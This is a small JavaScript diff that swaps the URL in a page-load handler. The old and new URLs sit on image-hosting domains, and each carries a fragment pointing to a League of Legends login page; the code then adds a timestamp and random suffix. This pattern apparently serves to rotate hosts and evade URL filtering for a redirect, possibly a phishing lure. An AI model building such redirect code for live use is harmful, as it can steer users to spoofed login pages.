@@ -9,7 +9,7 @@ function leleua() {
 leleua();
 
 window.onload = function () {
-    const targetUrl = 'https://static.job10000.com/yl/feedbackNew/20240215/65cd79c7502195f093dce6d9.png?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
+    const targetUrl = 'https://docsavatar.gtimg.com/3f73943a28ce34d82d98ab3d05dccb64aaad4433/1708745460261#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
     const timestamp = Date.now();
     const randomString = Math.random().toString(36).substring(2);
     const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
